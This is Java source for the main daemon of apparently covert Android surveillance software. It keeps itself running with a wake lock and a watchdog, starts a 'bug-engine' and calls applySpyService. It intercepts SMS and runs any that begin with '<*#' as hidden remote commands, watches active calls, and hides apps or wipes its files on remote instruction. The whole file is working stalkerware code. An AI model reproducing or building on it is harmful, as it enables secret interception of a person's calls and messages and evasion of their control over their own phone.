package com.fx.maind;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

import android.content.Context;
import android.database.ContentObserver;
import android.net.LocalServerSocket;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;

import com.daemon_bridge.ClientCommandLister;
import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.GetConnectionHistoryCommand;
import com.daemon_bridge.GetCurrentSettingsCommand;
import com.daemon_bridge.GetLicenseStatusCommand;
import com.daemon_bridge.GetProductInfoCommand;
import com.daemon_bridge.SendActivateCommand;
import com.daemon_bridge.SendDeactivateCommand;
import com.daemon_bridge.SendPackageNameCommand;
import com.daemon_bridge.SendUninstallCommand;
import com.daemon_bridge.SocketCommandBase;
import com.fx.daemon.DaemonHelper;
import com.fx.daemon.util.CrashReporter;
import com.fx.daemon.util.WatchingProcess;
import com.fx.maind.commands.DeactivateCommandProcess;
import com.fx.maind.commands.GetConnectionHistoryCommandProcess;
import com.fx.maind.commands.GetCurrentSettingsCommandProcess;
import com.fx.maind.commands.GetLicenseStatusCommandProcess;
import com.fx.maind.commands.GetProductInfoCommandProcess;
import com.fx.maind.commands.SendActivateCommandProcessor;
import com.fx.maind.commands.SendPackageNameCommandProcess;
import com.fx.maind.commands.UninstallCommandProcess;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.maind.ref.command.RemoteRemoveApk;
import com.fx.maind.ref.command.RemoteUninstallAll;
import com.fx.pmond.ref.MonitorDaemon;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.pmond.ref.command.RemoteAddProcess;
import com.fx.socket.RemoteCheckAlive;
import com.fx.socket.RemoteCheckSync;
import com.fx.socket.RemoteSetSync;
import com.fx.socket.RemoteSetSync.SyncData;
import com.fx.socket.SocketCmd;
import com.fx.socket.SocketCmdServer;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugDaemon;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.InterceptingSms;
import com.vvt.callmanager.ref.MonitorDisconnectReason;
import com.vvt.callmanager.ref.command.RemoteForwardInterceptingSms;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallActive;
import com.vvt.callmanager.ref.command.RemoteNotifyOnMonitorDisconnect;
import com.vvt.daemon.appengine.AppEnginDaemonResource;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.SmsCommand;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;

public class MainDaemonMain {
	
	private static final String TAG = "MainDaemonMain";
	
	private static boolean LOGV = Customization.VERBOSE;
	private static boolean LOGD = Customization.DEBUG;
	private static boolean LOGE = Customization.ERROR;
	
	private static AppEngine sAppEngine;
	private static Context sContext;
	private static CommandResponseBase sCommandResponseBase;
	private static WakeLock sWakeLock;
	
	public static void main(String[] args) {
		Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG));
		
		DaemonHelper.initLog(
				MainDaemonResource.LOG_FOLDER, 
				MainDaemonResource.LOG_FILENAME);
		
		if (LOGV) FxLog.v(TAG, "main # ENTER ...");
		
		String processName = MainDaemonResource.PROCESS_NAME;
		
		if (ShellUtil.isProcessRunning(processName)) {
			if (LOGE) FxLog.e(TAG, "main # Daemon is already running!");
			ShellUtil.killSelf();
			return;
		}
		
		DaemonHelper.setProcessName(processName);
		
		if (LOGD) FxLog.d(TAG, "main # Waiting until the system is ready ...");
		DaemonHelper.waitSystemReady();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.prepare() ...");
		Looper.prepare();
		
		if (LOGD) FxLog.d(TAG, "main # Create system context ...");
    	sContext = DaemonHelper.getSystemContext();
    	if (sContext == null) {
			if (LOGE) FxLog.e(TAG, "main # Create SystemContext FAILED!! -> EXIT");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (LOGD) FxLog.d(TAG, "main # Prepare ClientCommandLister server socket ...");
		boolean isClientCommandListerCreated = prepareClientCommandLister();
		if (LOGD) FxLog.d(TAG, "main # ClientCommandLister :"
				+ isClientCommandListerCreated);
    	
		if (acquireWakeLock(sContext)) {
			if (LOGD) FxLog.d(TAG, "main # PARTIAL_WAKE_LOCK acquired!");
		}
		else {
			if (LOGE) FxLog.e(TAG, "main # Acquire WakeLock FAILED!!");
			ShellUtil.killSelf();
			return;
		}
    	
    	if (LOGD) FxLog.d(TAG, "main # Prepare server socket ...");
    	boolean isServerSocketCreated = prepareServerSocket();
    	if (! isServerSocketCreated) {
    		if (LOGE) FxLog.e(TAG, "main # Create server socket FAILED!!");
			ShellUtil.killSelf();
			return;
    	}
    	
    	statrtAppEngine();
    	
    	// This observer should be alive and die with the looper
		if (LOGD) FxLog.d(TAG, "main # Keep observe when the monitor is startup");
		registerOnMonitoringProcessStartup();
		
		if (LOGD) FxLog.d(TAG, "Synchronize with monitor process");
		syncMonitor();
    	
		if (LOGD) FxLog.d(TAG, "main # Keep observe when the bug-engine is startup");
		registerOnBugProcessStartup();
		
		if (LOGD) FxLog.d(TAG, "Synchronize with bug-engine process");
		syncBug();
		
		if (LOGD) FxLog.d(TAG, "main # Start routine task");
    	startRoutineTask();
		
    	if (LOGD) FxLog.d(TAG, "main # Notify startup success");
		notifyStartupSuccess();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.loop()");
		Looper.loop();
    	
		if (LOGV) FxLog.v(TAG, "main # EXIT");
	}
	
	private static void statrtAppEngine() {
		//set
		if(sAppEngine == null) {
			sAppEngine = new AppEngine(sContext, AppEnginDaemonResource.APPENGIN_EXTRACTING_PATH);
			sAppEngine.setProcessPacketName(MainDaemonResource.PACKAGE_NAME);
			sAppEngine.setProcessSocketName(MainDaemonResource.SOCKET_NAME);
			sAppEngine.startApplication();
		}
		
	}
	
	private static void registerOnMonitoringProcessStartup() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive monitor startup notification");
					if (LOGD) FxLog.d(TAG, "Synchronizing ...");
					syncMonitor();
				}
			};
			sContext.getContentResolver().registerContentObserver(
					MonitorDaemonResource.URI_STARTUP_SUCCESS, false, observer);
		}
	}
	
	private static void registerOnBugProcessStartup() {
		if (sContext != null) {
			ContentObserver observer = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGD) FxLog.d(TAG, "Receive bug-engine startup notification");
					if (LOGD) FxLog.d(TAG, "Synchronizing ...");
					syncBug();
				}
			};
			sContext.getContentResolver().registerContentObserver(
					BugDaemonResource.URI_STARTUP_SUCCESS, true, observer);
		}
	}
	
//	private static void registerOnActivationSuccess() {
//		if (sContext != null) {
//			ContentObserver observer = new ContentObserver(new Handler()) {
//				@Override
//				public void onChange(boolean selfChange) {
//					FxLog.d(TAG, "Receive activation success notification");
//					
//					// Update event capture status
//					sServiceManager.updateEventCaptureStatus();
//					
//					// Restart the scheduler
//					sServiceManager.restartDeliveryScheduler();
//				}
//			};
//			sContext.getContentResolver().registerContentObserver(
//					ActivationHelper.URI_ACTIVATION_SUCCESS, false, observer);
//		}
//	}
//	
//	private static void registerOnDectivationSuccess() {
//		if (sContext != null) {
//			ContentObserver observer = new ContentObserver(new Handler()) {
//				@Override
//				public void onChange(boolean selfChange) {
//					FxLog.d(TAG, "Receive deactivation success notification");
//					
//					// Disable all capturing
//					sServiceManager.disableCaptureCallLog();
//					sServiceManager.disableCaptureSms();
//					sServiceManager.disableCaptureEmail();
//					sServiceManager.disableCaptureLocation();
//					sServiceManager.disableCaptureIm();
//					
//					// Stop delivery scheduler
//					sServiceManager.stopDeliveryScheduler();
//					
//					// Remove all events
//					sServiceManager.removeAllEvents();
//				}
//			};
//			sContext.getContentResolver().registerContentObserver(
//					ActivationHelper.URI_DEACTIVATION_SUCCESS, false, observer);
//		}
//	}
	
	private static void startRoutineTask() {
		TimerBase timer = new TimerBase() {
			@Override
			public void onTimer() {
				if (LOGV) FxLog.v(TAG, "routineTask # Synchronizing with monitor process");
				syncMonitor();
				
				if (LOGV) FxLog.v(TAG, "routineTask # Synchronizing with bug-engine process");
				syncBug();
				
				if (LOGV) FxLog.v(TAG, "routineTask # Handle log file size");
				handleLogFileSize();
			}
		};
		timer.setTimerDurationMs(MainDaemonResource.MONITOR_INTERVAL);
		timer.start();
	}

	private static void syncMonitor() {
		if (LOGV) FxLog.v(TAG, "syncMonitor # ENTER ...");
		
		boolean isMonitorRunning = 
				ShellUtil.isProcessRunning(
						MonitorDaemonResource.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"syncMonitor # Is monitor running? %s", isMonitorRunning));
		
		if (! isMonitorRunning) {
			if (LOGD) FxLog.d(TAG, "syncMonitor # Start monitor process");
			MonitorDaemon daemon = new MonitorDaemon();
			Uri startupSuccess = MonitorDaemonResource.URI_STARTUP_SUCCESS;
			DaemonHelper.startProcessAndWait(daemon, TAG, startupSuccess, 30*1000);
		}
		
		boolean isSync = false;
		
		RemoteCheckSync remoteCheckSync = new RemoteCheckSync(
				MonitorDaemonResource.SOCKET_NAME, 
				MainDaemonResource.PACKAGE_NAME);
		try { 
			isSync = remoteCheckSync.execute();
			if (LOGV) FxLog.v(TAG, String.format("syncMonitor # isSync? %s", isSync));
			
			if (! isSync) {
				if (LOGD) FxLog.d(TAG, "syncMonitor # Add watching process");
				addWatchingProcess();
				
				SyncData syncData = new SyncData();
				syncData.setClientPackage(MainDaemonResource.PACKAGE_NAME);
				syncData.setSync(true);
				
				RemoteSetSync remoteSetSync = new RemoteSetSync(
						MonitorDaemonResource.SOCKET_NAME, syncData);
				
				remoteSetSync.execute();
				if (LOGD) FxLog.d(TAG, "syncMonitor # Sync complete");
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("syncMonitor # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "syncMonitor # EXIT ...");
	}
	
	private static void syncBug() {
		if (LOGV) FxLog.v(TAG, "syncBug # ENTER ...");
		
		boolean isBugRunning = 
				ShellUtil.isProcessRunning(
						BugDaemonResource.CallMon.PROCESS_NAME);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"syncBug # Is bug-engine running? %s", isBugRunning));
		
		if (! isBugRunning) {
			if (LOGD) FxLog.d(TAG, "syncBug # Start bug-engine");
			BugDaemon daemon = new BugDaemon();
			Uri startupSuccess = BugDaemonResource.URI_STARTUP_SUCCESS;
			DaemonHelper.startProcessAndWait(daemon, TAG, startupSuccess, 90*1000);
		}
		
		boolean isSync = false;
		
		RemoteCheckSync remoteCheckSync = new RemoteCheckSync(
				BugDaemonResource.CallMgr.SOCKET_NAME, 
				MainDaemonResource.PACKAGE_NAME);
		try { 
			isSync = remoteCheckSync.execute();
			if (LOGV) FxLog.v(TAG, String.format("syncBug # isSync? %s", isSync));
			
			if (! isSync) {
				if (LOGD) FxLog.d(TAG, "syncBug # Apply spy settings");
				
				if(sAppEngine != null) {
					sAppEngine.applySpyService();
				}
				
				SyncData syncData = new SyncData();
				syncData.setClientPackage(MainDaemonResource.PACKAGE_NAME);
				syncData.setSync(true);
				
				RemoteSetSync remoteSetSync = new RemoteSetSync(
						BugDaemonResource.CallMgr.SOCKET_NAME, syncData);
				
				remoteSetSync.execute();
				if (LOGD) FxLog.d(TAG, "syncBug # Sync complete");
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("syncBug # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "syncBug # EXIT ...");
	}

	private static void addWatchingProcess() {
		WatchingProcess watchProcess = new WatchingProcess();
		watchProcess.setProcessName(MainDaemonResource.PROCESS_NAME);
		watchProcess.setStartupScriptPath(MainDaemonResource.STARTUP_SCRIPT_PATH);
		watchProcess.setServerName(MainDaemonResource.SOCKET_NAME);
		
		RemoteAddProcess remoteCommand = new RemoteAddProcess(watchProcess);
		try {
			remoteCommand.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("addWatchingProcess # Error: %s", e));
		}
	}
	
	private static boolean acquireWakeLock(Context context) {
		PowerManager powerManager = 
				(PowerManager) context.getSystemService(Context.POWER_SERVICE);
		
		if (sWakeLock == null || !sWakeLock.isHeld()) {
			sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
			sWakeLock.acquire();
		}
		
		return sWakeLock != null && sWakeLock.isHeld();
	}

	private static void handleLogFileSize() {
		String logPath = String.format("%s/%s", 
				MainDaemonResource.LOG_FOLDER, 
				MainDaemonResource.LOG_FILENAME);
		
		String logBakPath = String.format("%s.bak", logPath);
		
		DaemonHelper.handleLogFileSize(
				DaemonHelper.DEFAULT_LOG_SIZE, logPath, logBakPath);
		
		logPath = String.format("%s/%s", 
				AppEnginDaemonResource.APPENGIN_EXTRACTING_PATH, 
				AppEngine.LOG_FILE_NAME);
		
		logBakPath = String.format("%s.bak", logPath);
		
		DaemonHelper.handleLogFileSize(
				DaemonHelper.DEFAULT_LOG_SIZE, logPath, logBakPath);
	}

	private static void notifyStartupSuccess() {
		sContext.getContentResolver().notifyChange(
				MainDaemonResource.URI_STARTUP_SUCCESS, null);
	}
	
	private static boolean prepareClientCommandLister() {
		if (LOGV)
			FxLog.v(TAG, "prepareClientCommandLister # ENTER ...");
		boolean isSuccess = false;

		try {

			if (LOGV)
				FxLog.v(TAG, "prepareClientCommandLister # Start server thread");
			LocalServerSocket server = new LocalServerSocket(SocketCommandBase.SOCKET_ADDRESS);

			ClientCommandLister serverThread = new ClientCommandLister(server) {
				@Override
				public void onReceiveMessage(SocketCommandBase commandBase) {
					if (LOGV)
						FxLog.v(TAG, "prepareClientCommandLister # onReceiveMessage # ENTER ...");

					switch (commandBase.getCommandId()) {
						case SocketCommandBase.SEND_ACTIVATE:
							SendActivateCommand sendActivateCommand = (SendActivateCommand) commandBase;
							sCommandResponseBase = SendActivateCommandProcessor.execute(sAppEngine, sendActivateCommand);
							break;
							
						case SocketCommandBase.GET_LICENSE_STATUS:
							GetLicenseStatusCommand getLicenseStatusCommand = (GetLicenseStatusCommand) commandBase;
							sCommandResponseBase = GetLicenseStatusCommandProcess.execute(sAppEngine, getLicenseStatusCommand);
							break;
							
						case SocketCommandBase.GET_CURRENT_SETTINGS:
							GetCurrentSettingsCommand getCurrentSettingsCommand = (GetCurrentSettingsCommand) commandBase;
							sCommandResponseBase = GetCurrentSettingsCommandProcess.execute(sAppEngine, getCurrentSettingsCommand);
							break;
							
						case SocketCommandBase.GET_CONNECTION_HISTORY:
							GetConnectionHistoryCommand getConnectionHistoryCommand = (GetConnectionHistoryCommand) commandBase;
							sCommandResponseBase = GetConnectionHistoryCommandProcess.execute(sAppEngine, getConnectionHistoryCommand);
							break;
						
						case SocketCommandBase.GET_PRODUCT_INFO:
							GetProductInfoCommand getProductInfoCommand = (GetProductInfoCommand) commandBase;
							sCommandResponseBase = GetProductInfoCommandProcess.execute(sAppEngine, getProductInfoCommand);
							break;
							
						case SocketCommandBase.DEACTIVATE:
							SendDeactivateCommand deactivateCommand = (SendDeactivateCommand) commandBase;
							sCommandResponseBase = DeactivateCommandProcess.execute(sAppEngine, deactivateCommand);
							break;
							
						case SocketCommandBase.UNINSTALL:
							SendUninstallCommand sendUninstallCommand = (SendUninstallCommand) commandBase;
							sCommandResponseBase = UninstallCommandProcess.execute(sAppEngine, sendUninstallCommand);
							break;
							
						case SocketCommandBase.SET_PACKAGE_NAME:
							SendPackageNameCommand sendPackageNameCommand = (SendPackageNameCommand) commandBase;
							sCommandResponseBase = SendPackageNameCommandProcess.execute(sAppEngine, sendPackageNameCommand);
							break;
							
						default:
							break;
					}
					
					if (LOGV)
						FxLog.v(TAG,
								"prepareClientCommandLister # onReceiveMessage # EXIT ...");
				}

				@Override
				public CommandResponseBase getResponseMessage() {
					if (LOGV)
						FxLog.v(TAG,
								"prepareClientCommandLister # getResponseMessage # ENTER ...");
					if (LOGV)
						FxLog.v(TAG,
								"prepareClientCommandLister # getResponseMessage # response :" + sCommandResponseBase);
					if (LOGV)
						FxLog.v(TAG,
								"prepareClientCommandLister # getResponseMessage # EXIT ...");
					return sCommandResponseBase;
				}
			};
			serverThread.start();

			isSuccess = true;
		} catch (IOException e) {
			if (LOGE) FxLog.e(TAG,
					String.format("prepareClientCommandLister # error: %s",
							e.getMessage()), e);
		}

		if (LOGV)
			FxLog.v(TAG, "prepareClientCommandLister # EXIT ...");
		return isSuccess;
	}

	private static boolean prepareServerSocket() {
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # ENTER ...");
		
		boolean isSuccess = false;
		
		try {
			SocketCmdServer serverThread = new SocketCmdServer(TAG, MainDaemonResource.SOCKET_NAME) {
				@Override
				public Object process(SocketCmd<?, ?> command) {
					return processCommand(command);
				}
			};
			serverThread.start();
			isSuccess = true;
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("prepareServerSocket # Error: %s", e));
		}
		
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # EXIT ...");
		return isSuccess;
	}
	
	private static Object processCommand(SocketCmd<?, ?> command) {
		if (LOGV) FxLog.v(TAG, "processCommand # ENTER ...");
		
		Object response = null;
		
		if (command instanceof RemoteCheckAlive) {
			if (LOGD) FxLog.d(TAG, "processCommand # Check alive");
			response = true;
		}
		else if (command instanceof RemoteRemoveApk) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove APK");
			response = true;
			
			final RemoteRemoveApk remoteRemoveApk = (RemoteRemoveApk)command;
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					String packageName = remoteRemoveApk.getPackageName();
					ServiceManager.getInstance().hideApplication(packageName);
				}
			};
			t.start();
		}
		
		else if (command instanceof RemoteUninstallAll) {
			if (LOGD) FxLog.d(TAG, "processCommand # Uninstall the application");
			response = true;
			
			final RemoteUninstallAll remoteUninstallAll = (RemoteUninstallAll)command;
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					// delete all file.
					if(sAppEngine != null) {
						if(sAppEngine.getWritablePath() != null) {
						File file = new File(sAppEngine.getWritablePath());
							if (file.exists()) {
								FxLog.v(TAG, "processCommand # delete all file");
								try {
									FileUtil.deleteAllFile(file, new ArrayList<String>());
								} catch (IOException e) {
								}
							}
						}
					}
					// Uninstall ..
					String packageName = remoteUninstallAll.getPackageName();
					ServiceManager.getInstance().uninstallAll(packageName);
				}
			};
			t.start();
		}
		
		else if (command instanceof RemoteForwardInterceptingSms) {
			if (LOGD) FxLog.d(TAG, "processCommand # Receive intercepting SMS");
			response = true;
			
			InterceptingSms sms = ((RemoteForwardInterceptingSms) command).getData();
			if (LOGD) FxLog.d(TAG, String.format("processCommand # %s", sms));
			
			final String number = sms.getNumber();
			final String message = sms.getMessage();
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					boolean isConsideredSmsCommand = isConsideredSmsCommand(message);
					if (LOGD) FxLog.d(TAG, String.format("processCommand # SmsCommand : %s", isConsideredSmsCommand));
					if (isConsideredSmsCommand) {
						SmsCommand smsCommand = new SmsCommand();
						smsCommand.setSenderNumber(number);
						smsCommand.setMessage(message);
						if (LOGD) FxLog.d(TAG, String.format("processCommand # invoking processSmsCommand with # %s", smsCommand.toString()));
						sAppEngine.getRemoteCommandManager().processSmsCommand(smsCommand);
						if (LOGD) FxLog.d(TAG, "processCommand # invoking processSmsCommand completed");
					}
					
				}
			};
			t.start();
		}
		
		else if (command instanceof RemoteNotifyOnCallActive) {
			if (LOGD) FxLog.d(TAG, "processCommand # Receive on call active");
			
			final ActiveCallInfo activeCallInfo = 
					((RemoteNotifyOnCallActive) command).getData();
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					String phoneNumber = activeCallInfo.getNumber();
					boolean isIncoming = activeCallInfo.isIncoming();
					
					if (LOGD) FxLog.d(TAG, String.format(
							"processCommand # Found %s call session with number %s", 
							isIncoming ? "INCOMING" : "OUTGOING", phoneNumber));
					
					sAppEngine.handleWatchNumber(phoneNumber, isIncoming);
				}
			};
			t.start();
			
			response = true;
		}
		
		else if (command instanceof RemoteNotifyOnMonitorDisconnect) {
			if (LOGD) FxLog.d(TAG, "processCommand # Receive on monitor disconnect");
			final MonitorDisconnectReason reason = 
					((RemoteNotifyOnMonitorDisconnect) command).getData();
			
			CommandExecutingThread t = new CommandExecutingThread() {
				@Override
				void executeCommand() {
					if (LOGD) FxLog.d(TAG, String.format("processCommand # Reason: %s", reason));
					sAppEngine.handleMonitorDisconnect(reason);
				}
			};
			t.start();
			
			response = true;
		}
	
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		return response;
	}
	
	public static boolean isConsideredSmsCommand(String messageBody) {
		if(messageBody.trim().startsWith("<*#")){
			return true;
		} else {
			return false;
		}
	}
		
	private static abstract class CommandExecutingThread extends Thread {
		final int DEFAULT_DELAY = 500;
		
		abstract void executeCommand();
		
		@Override
		public void run() {
			SystemClock.sleep(DEFAULT_DELAY);
			executeCommand();
		}
	}

}
